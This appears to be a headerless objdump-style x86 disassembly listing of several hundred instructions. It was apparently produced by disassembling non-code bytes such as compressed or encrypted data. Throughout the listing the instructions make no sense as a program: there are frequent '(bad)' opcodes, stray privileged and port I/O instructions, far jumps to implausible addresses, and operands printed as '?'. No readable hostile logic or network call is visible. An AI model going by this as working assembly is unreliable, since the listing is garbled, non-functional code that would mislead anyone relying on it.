  419cbc:	lods   eax,DWORD PTR ds:[esi]
  419cbd:	sub    eax,0x855c41cc
  419cc2:	nop
  419cc3:	pushf  
  419cc4:	mov    DWORD PTR [esi-0x63],edi
  419cc7:	cmp    al,0xc7
  419cc9:	popf   
  419cca:	sub    edi,0x53e7e36c
  419cd0:	push   ds
  419cd1:	pop    eax
  419cd2:	popf   
  419cd3:	mov    ds:0xf717286c,al
  419cd8:	cmp    cl,BYTE PTR [ebx+0x59]
  419cdb:	(bad)  
  419cdc:	stos   DWORD PTR es:[edi],eax
  419cdd:	mov    al,0xf3
  419cdf:	xor    ch,dl
  419ce1:	push   ds
  419ce2:	leave  
  419ce3:	fadd   QWORD PTR ds:0xfce095ab
  419ce9:	fisub  WORD PTR ds:0x77f88773
  419cef:	sbb    dh,BYTE PTR [eax+0x38367435]
  419cf5:	addr16 popf 
  419cf7:	aam    0x3f
  419cf9:	mov    ebx,0x5fc1bcb6
  419cfe:	pop    esi
  419cff:	adc    cl,BYTE PTR [ebx-0x51]
  419d02:	in     al,dx
  419d03:	add    al,0x44
  419d05:	dec    edi
  419d06:	cmp    ebp,DWORD PTR [edx-0x729d3aec]
  419d0c:	mov    ch,0x7a
  419d0e:	or     eax,0x3b9f8cc8
  419d13:	in     al,0x3
  419d15:	xchg   bl,cl
  419d17:	jne    0x419d59
  419d19:	cmp    eax,DWORD PTR [edx+0x28]
  419d1c:	jp     0x419cca
  419d1e:	out    0xf2,eax
  419d20:	xchg   edx,eax
  419d21:	cmp    DWORD PTR [ecx+0x3a2cb7f6],ebp
  419d27:	sar    DWORD PTR [ecx+0x7],cl
  419d2a:	(bad)  
  419d2b:	xor    eax,0x1286bcfb
  419d30:	test   BYTE PTR [edx+0x12d2f77c],dh
  419d36:	popa   
  419d37:	dec    eax
  419d38:	adc    DWORD PTR [ebp-0x2f3bc3d7],esi
  419d3e:	sub    eax,0xbb8d435c
  419d43:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419d45:	pop    es
  419d46:	out    dx,al
  419d47:	ror    bh,0xdb
  419d4a:	xor    al,0xe9
  419d4c:	push   esi
  419d4d:	test   eax,0xd2af31da
  419d52:	(bad)  
  419d53:	in     al,0x54
  419d55:	jg     0x419dc0
  419d57:	adc    edi,DWORD PTR [edx]
  419d59:	shr    ah,cl
  419d5b:	mov    edx,0x6218102c
  419d60:	add    al,0xef
  419d62:	inc    edi
  419d63:	jp     0x419daf
  419d65:	retf   
  419d66:	or     BYTE PTR [ebp-0x7714595c],0x3f
  419d6d:	adc    eax,0x8c0143af
  419d72:	(bad)  
  419d73:	and    DWORD PTR [di+0x9],ecx
  419d77:	rol    DWORD PTR [eax+edx*1-0x1c],0xa2
  419d7c:	dec    edx
  419d7d:	shl    DWORD PTR [ecx],cl
  419d7f:	jmp    0x419d92
  419d81:	loope  0x419daa
  419d83:	imul   ebp,eax,0x1e4857bc
  419d89:	pop    edx
  419d8a:	add    BYTE PTR [esi],dl
  419d8c:	iret   
  419d8d:	popa   
  419d8e:	retf   
  419d8f:	inc    ecx
  419d90:	dec    ecx
  419d91:	mov    esp,0xc4087629
  419d96:	mov    DWORD PTR [esi],edx
  419d98:	mov    al,0x4d
  419d9a:	push   ebx
  419d9b:	jne    0x419d20
  419d9d:	xor    al,0x2d
  419d9f:	mov    eax,ecx
  419da1:	xchg   edi,eax
  419da2:	dec    ebx
  419da3:	or     esp,DWORD PTR [esi-0x6322bd67]
  419da9:	ret    0xe861
  419dac:	lods   eax,DWORD PTR ds:[esi]
  419dad:	fmul   DWORD PTR [esi]
  419daf:	stos   DWORD PTR es:[edi],eax
  419db0:	adc    cl,al
  419db2:	out    dx,al
  419db3:	retf   0x85c1
  419db6:	xor    al,0xb9
  419db8:	and    al,0x5a
  419dba:	scas   eax,DWORD PTR es:[edi]
  419dbb:	test   eax,0x66ca4b5d
  419dc0:	push   ds
  419dc1:	retf   
  419dc2:	adc    BYTE PTR [edi+0x54],dl
  419dc5:	aaa    
  419dc6:	es xor al,0xe1
  419dc9:	adc    al,0x4e
  419dcb:	data16 fisttp QWORD PTR [ecx+0x5ada8e]
  419dd2:	dec    ecx
  419dd3:	mov    ebp,0x4f5b81e0
  419dd8:	sub    dl,BYTE PTR [esp+eax*1]
  419ddb:	add    BYTE PTR [edx],ch
  419ddd:	xchg   cl,bl
  419ddf:	and    DWORD PTR [edi-0x7b193057],ecx
  419de5:	add    ebp,DWORD PTR [esi+0x3f]
  419de8:	fstp   QWORD PTR [esi+0x17]
  419deb:	jge    0x419d9a
  419ded:	loope  0x419ddf
  419def:	scas   eax,DWORD PTR es:[edi]
  419df0:	dec    ebp
  419df1:	push   eax
  419df2:	fidiv  DWORD PTR [esi-0x70]
  419df5:	cdq    
  419df6:	out    dx,eax
  419df7:	ja     0x419d89
  419df9:	retf   
  419dfa:	xor    cl,dh
  419dfc:	inc    edi
  419dfd:	pop    esi
  419dfe:	jns    0x419e5e
  419e00:	jmp    0x419dec
  419e02:	jns    0x419e39
  419e04:	loopne 0x419d8c
  419e06:	mov    ds,WORD PTR [ecx-0x45]
  419e09:	cmp    eax,0xca5bc750
  419e0e:	sbb    eax,0x518d23f1
  419e13:	xchg   esp,eax
  419e14:	xchg   sp,ax
  419e16:	xor    al,0xb0
  419e18:	push   esi
  419e19:	(bad)
  419e1c:	in     al,dx
  419e1d:	mov    dl,0x5d
  419e1f:	jb     0x419e38
  419e21:	mov    BYTE PTR [edx],ah
  419e23:	xor    DWORD PTR [ebx],ebp
  419e25:	mov    dl,0x69
  419e27:	dec    edi
  419e28:	add    ecx,0xa059de62
  419e2e:	dec    edi
  419e2f:	(bad)  
  419e30:	gs jmpw 0xac9d
  419e35:	ret    
  419e36:	ds pop ebx
  419e38:	or     dl,cl
  419e3a:	in     eax,0xdb
  419e3c:	shl    BYTE PTR [ecx-0x6fdfc90],0x84
  419e43:	mov    edi,0x5ed7e296
  419e48:	bound  ebx,QWORD PTR [edx-0x6dd56658]
  419e4e:	pop    ds
  419e4f:	scas   eax,DWORD PTR es:[edi]
  419e50:	sbb    al,0x9e
  419e52:	cmp    bh,BYTE PTR ds:0xe46511aa
  419e58:	jp     0x419e16
  419e5a:	jnp    0x419e3d
  419e5c:	push   ecx
  419e5d:	pushf  
  419e5e:	add    BYTE PTR [ecx-0x74],ah
  419e61:	(bad)  
  419e62:	adc    bl,BYTE PTR [esi+0x7856b770]
  419e68:	sahf   
  419e69:	mov    bl,0x86
  419e6b:	xchg   ebx,eax
  419e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e6d:	mov    edx,0xd5be6c6e
  419e72:	xchg   edi,eax
  419e73:	(bad)  
  419e74:	seta   BYTE PTR [ebx]
  419e77:	fs or  edx,ebx
  419e7a:	(bad)  
  419e7c:	mul    DWORD PTR [ebp+eax*4+0x16]
  419e80:	out    0xba,al
  419e82:	retf   0xc9e0
  419e85:	mov    ah,0x55
  419e87:	fnstsw WORD PTR [eax-0x68]
  419e8a:	cmp    edi,ebx
  419e8c:	mov    edi,0x91c581c6
  419e91:	bnd jne 0x419eb6
  419e94:	(bad)  
  419e95:	fwait
  419e96:	pop    edx
  419e97:	(bad)  
  419e98:	(bad)  
  419e99:	jmp    0x53da:0xa8198e1d
  419ea0:	mov    al,0x55
  419ea2:	add    eax,0x404f658a
  419ea7:	imul   eax,DWORD PTR [eax-0x417980a8],0x87f1a7ab
  419eb1:	xor    al,0xea
  419eb3:	push   cs
  419eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb5:	and    dh,ah
  419eb7:	xchg   ah,cl
  419eb9:	scas   eax,DWORD PTR es:[edi]
  419eba:	sbb    DWORD PTR ds:0x2760f72c,edi
  419ec0:	je     0x419ed7
  419ec2:	xor    bh,al
  419ec4:	cmp    ah,BYTE PTR [ebx]
  419ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ec7:	out    dx,eax
  419ec8:	mov    al,0x92
  419eca:	(bad)  [edx]
  419ecc:	cwde   
  419ecd:	emms   
  419ecf:	mov    WORD PTR [ebx*4-0x64536d7c],fs
  419ed6:	mov    ch,0xb9
  419ed8:	sub    bh,BYTE PTR [edi-0x72]
  419edb:	sub    bh,BYTE PTR [ebp+0xa559eae]
  419ee1:	stos   DWORD PTR es:[edi],eax
  419ee2:	aas    
  419ee3:	ja     0x419f3d
  419ee5:	(bad)  
  419ee7:	mov    dh,0x24
  419ee9:	imul   DWORD PTR [edx]
  419eeb:	pop    ss
  419eec:	jecxz  0x419f01
  419eee:	xlat   BYTE PTR ds:[ebx]
  419eef:	pop    ds
  419ef0:	mov    ecx,0xa032c259
  419ef5:	out    0x12,al
  419ef7:	pop    ss
  419ef8:	push   eax
  419ef9:	mov    DWORD PTR [ebp-0x3977e2b4],edx
  419eff:	xor    DWORD PTR [eax],edx
  419f01:	pop    ss
  419f02:	or     BYTE PTR [esi],al
  419f04:	test   DWORD PTR [ebp-0x4e7e54f7],edx
  419f0a:	xchg   ebp,eax
  419f0b:	mov    eax,0x586939d9
  419f10:	inc    eax
  419f11:	das    
  419f12:	xlat   BYTE PTR ds:[ebx]
  419f13:	ret    0x35ce
  419f16:	xor    eax,0xa27c92fd
  419f1b:	dec    eax
  419f1c:	dec    eax
  419f1d:	dec    ecx
  419f1e:	popf   
  419f1f:	fdivrp st(6),st
  419f21:	and    esp,DWORD PTR [edx+0x57a54373]
  419f27:	(bad)
  419f2a:	jmp    0x419f35
  419f2c:	ret    0x41c9
  419f2f:	sub    al,0xa8
  419f31:	mov    bl,dl
  419f33:	shl    DWORD PTR [ebx],cl
  419f35:	idiv   DWORD PTR cs:[ebp-0x3cd713eb]
  419f3c:	aad    0x4e
  419f3e:	adc    al,0xf3
  419f40:	pop    edx
  419f41:	pop    esi
  419f42:	mov    dh,0xb0
  419f44:	pop    eax
  419f45:	scas   al,BYTE PTR es:[edi]
  419f46:	cmp    DWORD PTR [edi],ebp
  419f48:	mov    DWORD PTR [edi],eax
  419f4a:	js     0x419faa
  419f4c:	sub    BYTE PTR [edi],0x6f
  419f4f:	scas   al,BYTE PTR es:[edi]
  419f50:	xchg   DWORD PTR [esi],esi
  419f52:	and    bl,BYTE PTR [edi+ecx*4-0x34]
  419f56:	xchg   ebp,ebp
  419f58:	fwait
  419f59:	push   edx
  419f5a:	jp     0x419f9f
  419f5c:	mov    ds:0xbffbf878,eax
  419f61:	xchg   DWORD PTR [esi],ecx
  419f63:	(bad)  [ecx+ebp*8+0x7b6e6728]
  419f6a:	adc    al,0xe5
  419f6c:	mov    dh,0x18
  419f6e:	sbb    DWORD PTR [ecx],eax
  419f70:	out    0xc0,eax
  419f72:	or     DWORD PTR [edi-0x3d820fd6],ecx
  419f78:	pop    edx
  419f79:	xchg   edx,eax
  419f7a:	retf   
  419f7b:	jns    0x419f4d
  419f7d:	mov    ah,0x8b
  419f7f:	jno    0x419f9f
  419f81:	sbb    DWORD PTR [eax+0x33a8456f],esp
  419f87:	jmp    0xfcbf:0x66f7a1d
  419f8e:	aas    
  419f8f:	mov    ds:0x57a1f937,eax
  419f94:	pop    edx
  419f95:	mov    esp,0xe34d9732
  419f9a:	mov    eax,ds:0x19f3d21e
  419f9f:	out    0x17,al
  419fa1:	pslld  mm2,QWORD PTR [edi-0x2f]
  419fa5:	xchg   BYTE PTR [esi],bl
  419fa7:	pop    ecx
  419fa8:	pop    edx
  419fa9:	outs   dx,BYTE PTR ds:[esi]
  419faa:	dec    edi
  419fab:	fisttp WORD PTR [edi]
  419fad:	jle    0x419f6a
  419faf:	xor    BYTE PTR [edx+0x40],bh
  419fb2:	add    BYTE PTR [ebx+ecx*1],bl
  419fb5:	mov    DWORD PTR [ebx],esi
  419fb7:	call   FWORD PTR [edx]
  419fb9:	mov    eax,ds:0x53a3a5da
  419fbe:	push   0x93136bf1
  419fc3:	add    al,0x35
  419fc5:	aas    
  419fc6:	out    0xa7,eax
  419fc8:	ds scas al,BYTE PTR es:[edi]
  419fca:	sub    ah,BYTE PTR ds:0xef8f36bd
  419fd0:	js     0x41a008
  419fd2:	mov    esp,0x90da9cc5
  419fd7:	jb     0x41a015
  419fd9:	cmp    DWORD PTR [ecx+0x35],0x7bde83b5
  419fe0:	(bad)  
  419fe1:	mov    ds:0x1c95e25f,eax
  419fe6:	pop    edi
  419fe7:	mov    dl,0x53
  419fe9:	push   ss
  419fea:	out    dx,eax
  419feb:	out    0x52,al
  419fed:	enter  0xa7d0,0x6d
  419ff1:	push   ebp
  419ff2:	or     DWORD PTR [esi],edx
  419ff4:	dec    edi
  419ff5:	jnp    0x41a026
  419ff7:	add    esi,esp
  419ff9:	std    
  419ffa:	add    DWORD PTR [ecx+0x5f],ecx
  419ffd:	xchg   ebp,eax
  419ffe:	sbb    al,0xaa
  41a000:	mov    WORD PTR [edx+ecx*4],?
  41a003:	mov    WORD PTR ds:0x89adbed2,es
  41a009:	push   es
  41a00a:	ss dec edi
  41a00c:	cli    
  41a00d:	and    ecx,esp
  41a00f:	and    DWORD PTR [ebx+0x2c],esi
  41a012:	pop    ss
  41a013:	push   eax
  41a014:	scas   al,BYTE PTR es:[edi]
  41a015:	jno    0x419fb8
  41a017:	call   0x12d4876
  41a01c:	jae    0x41a051
  41a01e:	sub    BYTE PTR [esi-0x1f],bh
  41a021:	inc    ebp
  41a022:	jge    0x419fe5
  41a024:	add    esi,DWORD PTR [ebx-0x3290e059]
  41a02a:	test   ebp,0xf2d221fd
  41a030:	adc    dh,BYTE PTR [esp+edx*8+0x1bb7b447]
  41a037:	push   esp
  41a038:	xlat   BYTE PTR ds:[ebx]
  41a039:	mov    ch,0x5f
  41a03b:	pop    edx
  41a03c:	xlat   BYTE PTR ds:[ebx]
  41a03d:	call   DWORD PTR [eax+ebp*8-0x19dbec66]
  41a044:	in     eax,0xb9
  41a046:	fimul  DWORD PTR [esi]
  41a048:	leave  
  41a049:	mov    edi,esi
  41a04b:	or     BYTE PTR [ebp+eax*1+0x1b],bl
  41a04f:	and    esp,DWORD PTR [ebx]
  41a051:	and    dh,BYTE PTR [ecx+0xb3ad6a2]
  41a057:	push   esi
  41a058:	jne    0x41a00b
  41a05a:	ret    0x5bcf
  41a05d:	popa   
  41a05e:	stos   DWORD PTR es:[edi],eax
  41a05f:	xchg   edi,eax
  41a060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a061:	add    BYTE PTR [esi+esi*2+0x608de41c],ch
  41a068:	ror    BYTE PTR [ecx],0x4e
  41a06b:	out    0xa,eax
  41a06d:	sysenter 
  41a06f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a070:	sub    BYTE PTR [ebx-0x25],0x6a
  41a074:	out    dx,eax
  41a075:	pop    es
  41a076:	mov    ?,WORD PTR [ebx+0x62]
  41a079:	add    ch,BYTE PTR [ebp+0x6de6ce3d]
  41a07f:	and    eax,DWORD PTR [ecx-0x48]
  41a082:	and    ah,BYTE PTR [ecx-0x7d]
  41a085:	hlt    
  41a086:	push   ss
  41a087:	inc    edx
  41a088:	dec    WORD PTR [ecx-0x4]
  41a08c:	mov    ch,0x36
  41a08e:	xor    BYTE PTR [esi+0x1d],al
  41a091:	mov    DWORD PTR [ecx+0x137532e9],edx
  41a097:	out    dx,al
  41a098:	fs dec esi
  41a09a:	(bad)  
  41a09b:	addsubps xmm4,xmm5
  41a09f:	or     BYTE PTR [esi-0x5c],ch
  41a0a2:	fnstenv [edx-0x50a73305]
  41a0a8:	adc    eax,0xc56c168e
  41a0ad:	sahf   
  41a0ae:	or     eax,0x408f13fe
  41a0b3:	aam    0xda
  41a0b5:	sbb    DWORD PTR [ebp-0x64541e8f],edx
  41a0bb:	push   esp
  41a0bc:	inc    ecx
  41a0bd:	mov    edx,DWORD PTR [ebp+esi*1-0x4e]
  41a0c1:	pop    DWORD PTR [edx+0x5d]
  41a0c4:	fldcw  WORD PTR [ebx+0x48f2f7c2]
  41a0ca:	adc    eax,0x87b0cd53
  41a0cf:	push   ss
  41a0d0:	sahf   
  41a0d1:	sub    eax,0x975ff321
  41a0d6:	xor    al,0xfe
  41a0d8:	test   eax,0xf1c349d6
  41a0dd:	sti    
  41a0de:	fistp  WORD PTR [esi+0x2362776f]
  41a0e4:	fwait
  41a0e5:	ja     0x41a081
  41a0e7:	ins    BYTE PTR es:[edi],dx
  41a0e8:	xlat   BYTE PTR ds:[ebx]
  41a0e9:	imul   edi,DWORD PTR [edi+0x76],0x22
  41a0ed:	sub    ah,bl
  41a0ef:	mov    ebx,0x855cf3a9
  41a0f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0f5:	mov    bl,0xae
  41a0f7:	test   eax,0xcf76218e
  41a0fc:	scas   eax,DWORD PTR es:[edi]
  41a0fd:	retf   
  41a0fe:	bound  ebp,QWORD PTR [ebx]
  41a100:	imul   esi,eax,0x3c
  41a103:	popf   
  41a104:	and    esi,esi
  41a106:	arpl   WORD PTR [ebp+0x73],sp
  41a109:	adc    DWORD PTR [ecx+edi*1],0xfffffff6
  41a10d:	inc    ebp
  41a10e:	push   0x3ba44d3a
  41a113:	xchg   ecx,eax
  41a114:	mov    al,0x67
  41a116:	mov    bh,0x28
  41a118:	js     0x41a14b
  41a11a:	dec    ebx
  41a11b:	lods   al,BYTE PTR ds:[esi]
  41a11c:	cmc    
  41a11d:	mov    bh,0x6c
  41a11f:	sbb    DWORD PTR [ecx],ebp
  41a121:	rcl    eax,1
  41a123:	jg     0x41a0d4
  41a125:	retf   0x60b4
  41a128:	xor    eax,0x258bb37a
  41a12d:	jmp    0x41a181
  41a12f:	xchg   esp,eax
  41a130:	fbld   TBYTE PTR [ecx]
  41a132:	retf   
  41a133:	je     0x41a0eb
  41a135:	push   ebx
  41a136:	add    BYTE PTR [ecx+ebp*8],ah
  41a139:	mov    eax,ds:0xf38d6f8d
  41a13e:	jge    0x41a19b
  41a140:	ss pop esp
  41a142:	iret   
  41a143:	xor    eax,0xb51610c4
  41a148:	and    DWORD PTR [ebx+0x664ec050],ecx
  41a14e:	mov    ebx,0x5ec9c76b
  41a153:	sti    
  41a154:	imul   BYTE PTR [ebp-0x72]
  41a157:	sbb    BYTE PTR cs:[edx-0x14a5a7a0],al
  41a15e:	(bad)  
  41a160:	shr    bl,1
  41a162:	mov    ds:0x7dd8d019,eax
  41a167:	dec    esi
  41a168:	ror    DWORD PTR [ecx-0x12cf1c03],cl
  41a16e:	sbb    eax,0xb9002a82
  41a173:	in     eax,dx
  41a174:	mov    esp,0xe66223f9
  41a179:	cdq    
  41a17a:	add    DWORD PTR [ecx-0x50],0xe8c98477
  41a181:	inc    ebx
  41a182:	outs   dx,BYTE PTR ds:[esi]
  41a183:	jmp    0xd85f1925
  41a188:	push   0xffffffe3
  41a18a:	push   es
  41a18b:	retf   
  41a18c:	adc    al,0x4b
  41a18e:	mov    WORD PTR [esi+0xbacf2ac],?
  41a194:	mov    BYTE PTR [edi+0x2e79ea40],ah
  41a19a:	(bad)  
  41a19c:	xchg   ecx,eax
  41a19d:	iret   
  41a19e:	xor    bh,BYTE PTR [esi+0x7d8f7dae]
  41a1a4:	inc    ecx
  41a1a5:	ret    0xd35
  41a1a8:	mov    esp,0x13901310
  41a1ad:	dec    esi
  41a1ae:	adc    eax,0x3864008e
  41a1b3:	inc    ebx
  41a1b4:	and    ebp,ecx
  41a1b6:	out    0x1,eax
  41a1b8:	retf   0x7fb8
  41a1bb:	rcr    ah,1
  41a1bd:	and    ebp,0xfffffffd
  41a1c0:	adc    ah,BYTE PTR [ebp+0x64]
  41a1c3:	mov    BYTE PTR [esi-0x60],dl
  41a1c6:	pop    esp
  41a1c7:	or     DWORD PTR [ecx+edi*4-0x3d8a9410],edx
  41a1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1cf:	mov    bh,0x8b
  41a1d1:	mov    ebx,DWORD PTR ss:[edi+0x6b118a4]
  41a1d8:	add    DWORD PTR [esi-0x3f10b7a1],edi
  41a1de:	dec    esi
  41a1df:	ror    BYTE PTR [ecx],0x2d
  41a1e2:	lods   eax,DWORD PTR ds:[esi]
  41a1e3:	clc    
  41a1e4:	out    0x5b,eax
  41a1e6:	les    ecx,FWORD PTR [ebx+0x7a8a948d]
  41a1ec:	ja     0x41a214
  41a1ee:	cmp    eax,0x651de995
  41a1f3:	or     BYTE PTR [edi+0x2e],dh
  41a1f6:	dec    ebx
  41a1f7:	pop    es
  41a1f8:	imul   ebx,ecx,0x8e370ffe
  41a1fe:	cmp    eax,0xab614ebf
  41a203:	mov    bh,0x3b
  41a205:	lock mov dh,0xfe
  41a208:	pavgb  mm0,mm5
  41a20b:	push   0x7c0d8b96
  41a210:	jmp    0xe6023c2d
  41a215:	fdivr  st,st(7)
  41a217:	aad    0x93
  41a219:	mov    WORD PTR [edi],gs
  41a21b:	jmp    0x6ad9207e
  41a220:	ja     0x41a297
  41a222:	jle    0x41a1cf
  41a224:	lock pushf 
  41a226:	lods   eax,DWORD PTR ds:[esi]
  41a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a228:	call   0xf097:0x50e9bf4e
  41a22f:	inc    edx
  41a230:	cmp    edi,DWORD PTR [ebx-0x21]
  41a233:	mov    esp,0x79d723e3
  41a238:	bound  esp,QWORD PTR [edi-0x3a6c68eb]
  41a23e:	fcomp  DWORD PTR [ebx]
  41a240:	out    0xd1,eax
  41a242:	sbb    edi,ebx
  41a244:	data16 fcom DWORD PTR [ecx]
  41a247:	cmp    esp,DWORD PTR [esp+ecx*4-0x580ab0ac]
  41a24e:	js     0x41a216
  41a250:	fstp   TBYTE PTR [ebx]
  41a252:	push   esp
  41a253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a254:	outs   dx,DWORD PTR ds:[esi]
  41a255:	push   cs
  41a256:	cwde   
  41a257:	jae    0x41a288
  41a259:	ret    0xcd4c
  41a25c:	xchg   edi,eax
  41a25d:	add    al,0x1c
  41a25f:	fsub   st(4),st
  41a261:	and    al,0x74
  41a263:	and    al,0x2f
  41a265:	hlt    
  41a266:	in     al,0xd1
  41a268:	or     DWORD PTR ds:0x5b96454d,ecx
  41a26e:	jnp    0x41a2da
  41a270:	sar    ecx,cl
  41a272:	mov    esp,0xc45f2005
  41a277:	push   0x5b12cd21
  41a27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a27d:	ins    DWORD PTR es:[edi],dx
  41a27e:	aas    
  41a27f:	daa    
  41a280:	xchg   edi,eax
  41a281:	pop    ecx
  41a282:	jle    0x41a236
  41a284:	pop    esi
  41a285:	inc    esi
  41a286:	hlt    
  41a287:	xchg   edi,eax
  41a288:	std    
  41a289:	xchg   esi,eax
  41a28a:	or     edi,eax
  41a28c:	retf   
  41a28d:	inc    ebp
  41a28e:	std    
  41a28f:	xchg   ecx,eax
  41a290:	in     al,0x1c
  41a292:	pop    ebp
  41a293:	sbb    al,0x90
  41a295:	mov    edi,0x63f48b63
  41a29a:	outs   dx,BYTE PTR ds:[esi]
  41a29b:	int3   
  41a29c:	pop    esp
  41a29d:	int3   
  41a29e:	jge    0x41a26a
  41a2a0:	mov    al,ds:0x163a76b1
  41a2a5:	sbb    eax,0x299efcb
  41a2aa:	rdmsr  
  41a2ac:	mov    BYTE PTR [ecx-0x1f],0xcf
  41a2b0:	imul   edx,ebx,0xffffff89
  41a2b3:	jnp    0x41a2f6
  41a2b5:	mov    ecx,0xcad5a1ca
  41a2ba:	jg     0x41a267
  41a2bc:	and    al,0x93
  41a2be:	bound  ecx,QWORD PTR [ebx]
  41a2c0:	cmp    al,dh
  41a2c2:	scas   eax,DWORD PTR es:[edi]
  41a2c3:	out    0x32,al
  41a2c5:	stos   DWORD PTR es:[edi],eax
  41a2c6:	mov    esp,0xce3d3c1c
  41a2cb:	or     ax,0x90da
  41a2cf:	pop    ss
  41a2d0:	repz cmp DWORD PTR [eax-0x317790f],edx
  41a2d7:	jge    0x41a2d0
  41a2d9:	popf   
  41a2da:	jae    0x41a2c3
  41a2dc:	adc    ebp,DWORD PTR [edi-0x70]
  41a2df:	or     al,0x50
  41a2e1:	mov    al,0x47
  41a2e3:	sti    
  41a2e4:	xchg   edx,eax
  41a2e5:	fldenv ds:0xba9a0816
  41a2eb:	imul   eax,DWORD PTR [ebp+0x3005d81d],0x50
  41a2f2:	ins    DWORD PTR es:[edi],dx
  41a2f3:	or     eax,0xcca70c3c
  41a2f8:	scas   eax,DWORD PTR es:[edi]
  41a2f9:	in     al,dx
  41a2fa:	cli    
  41a2fb:	mov    dh,0x70
  41a2fd:	imul   edx,DWORD PTR [esi],0x45
  41a300:	jl     0x41a2d9
  41a302:	outs   dx,BYTE PTR ds:[esi]
  41a303:	and    ch,BYTE PTR [edx-0x6f672249]
  41a309:	bound  eax,QWORD PTR [esi]
  41a30b:	outs   dx,BYTE PTR cs:[esi]
  41a30d:	cmp    al,BYTE PTR [esi]
  41a30f:	ror    DWORD PTR [edi+0x44],cl
  41a312:	fistp  WORD PTR [ebp-0x69]
  41a315:	pop    ds
  41a316:	mov    dl,0x4c
  41a318:	xchg   sp,ax
  41a31a:	adc    ecx,DWORD PTR [eax+0x12]
  41a31d:	test   eax,0x3e93b17f
  41a322:	xchg   edx,eax
  41a323:	mov    cl,0x2f
  41a325:	or     ecx,DWORD PTR [edi]
  41a327:	in     eax,dx
  41a328:	xchg   ebx,eax
  41a329:	repz rcl dl,1
  41a32c:	sub    eax,DWORD PTR [ebp-0x18]
  41a32f:	sbb    eax,0xe2f0dabf
  41a334:	push   esi
  41a335:	ret    0xf8d9
  41a338:	mov    cl,0x3
  41a33a:	xor    eax,ecx
  41a33c:	push   edx
  41a33d:	jbe    0x41a350
  41a33f:	inc    ebx
  41a340:	ins    BYTE PTR es:[edi],dx
  41a341:	mov    bh,0xb2
  41a343:	shr    BYTE PTR [esi],0x73
  41a346:	mov    esp,0xbc2cac48
  41a34b:	retf   0x376
  41a34e:	pop    ebp
  41a34f:	(bad)  
  41a350:	iret   
  41a351:	in     al,0x3d
  41a353:	jg     0x41a369
  41a355:	outs   dx,DWORD PTR ds:[esi]
  41a356:	adc    edi,esp
  41a358:	xor    al,BYTE PTR [esi]
  41a35a:	sbb    BYTE PTR [ebx+0x63193efa],dl
  41a360:	cmp    edx,DWORD PTR [eax+0x40]
  41a363:	mov    ?,WORD PTR [eax+0x5c]
  41a366:	cmp    ebx,eax
  41a368:	dec    DWORD PTR [edx]
  41a36a:	pop    edx
  41a36b:	into   
  41a36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a36d:	test   BYTE PTR [ebx+edx*2-0x3e36e711],ch
  41a374:	pop    ss
  41a375:	cmp    ebp,ebx
  41a377:	push   esi
  41a378:	push   0x9a1d6d74
  41a37d:	popa   
  41a37e:	jecxz  0x41a30d
  41a380:	pop    ds
  41a381:	pop    ebx
  41a382:	test   al,0x1d
  41a384:	inc    esi
  41a385:	push   edi
  41a386:	inc    ebx
  41a387:	jmp    0x352bb21e
  41a38c:	in     ax,0x82
  41a38f:	dec    edx
  41a390:	ret    
  41a391:	gs lock push edi
  41a394:	lods   eax,DWORD PTR ds:[esi]
  41a395:	(bad)  
  41a396:	aad    0xba
  41a398:	inc    edi
  41a399:	mov    ebx,0x9044dcd0
  41a39e:	gs das 
  41a3a0:	jp     0x41a3c2
  41a3a2:	pop    esp
  41a3a4:	jle    0x41a3f3
  41a3a6:	jmp    0xfbe3:0xfe0d4e4f
  41a3ad:	loop   0x41a394
  41a3af:	out    0x9f,eax
  41a3b1:	(bad)  
  41a3b2:	mov    ebp,0x5e34ae43
  41a3b7:	cmp    BYTE PTR [edi-0x3437ecf4],0x19
  41a3be:	push   ss
  41a3bf:	and    bh,BYTE PTR [ebp+ebx*4+0x5836b16]
  41a3c6:	lods   al,BYTE PTR ds:[esi]
  41a3c7:	addr16 or al,0x7f
  41a3ca:	jno    0x41a416
  41a3cc:	push   ss
  41a3cd:	pop    ebx
  41a3ce:	sbb    bl,BYTE PTR [ecx+ecx*1-0x66aa2f0]
  41a3d5:	lods   al,BYTE PTR ds:[esi]
  41a3d6:	pop    ebx
  41a3d7:	out    dx,al
  41a3d8:	push   0x9c55fd6
  41a3dd:	fldenv [ecx+eax*2-0x4f9098ab]
  41a3e4:	loop   0x41a3fe
  41a3e6:	shl    DWORD PTR [ebx-0x35],cl
  41a3e9:	dec    esp
  41a3ea:	xor    dh,BYTE PTR [edi-0x7a898fcc]
  41a3f0:	data16 fstp DWORD PTR [edx]
  41a3f3:	gs je  0x41a404
  41a3f6:	push   cs
  41a3f7:	jmp    0x41a468
  41a3f9:	dec    esp
  41a3fa:	xchg   ebp,eax
  41a3fb:	adc    BYTE PTR [ecx],bh
  41a3fd:	sbb    esp,DWORD PTR [edi+0x75ca66e3]
  41a403:	and    BYTE PTR [eax+0xb],0x94
  41a407:	dec    ecx
  41a408:	adc    BYTE PTR ds:0x501f99ab,0x9a
  41a40f:	mov    cl,0xea
  41a411:	fwait
  41a412:	popa   
  41a413:	sub    BYTE PTR [edi+0x72],0x3f
  41a417:	mov    esp,ebp
  41a419:	stos   BYTE PTR es:[edi],al
  41a41a:	mov    ecx,0x6c0870a8
  41a41f:	push   ss
  41a420:	push   ecx
  41a421:	in     al,dx
  41a422:	(bad)  
  41a423:	xchg   edx,eax
  41a424:	adc    cl,BYTE PTR [edi]
  41a426:	retf   
  41a427:	call   0x83ea3b9d
  41a42c:	mov    dh,0xf8
  41a42e:	leave  
  41a42f:	jecxz  0x41a49c
  41a431:	jnp    0x41a441
  41a433:	sub    al,0x1f
  41a435:	(bad)
  41a43a:	inc    edx
  41a43b:	sub    al,0xa4
  41a43d:	and    DWORD PTR [ebp+0x19],ecx
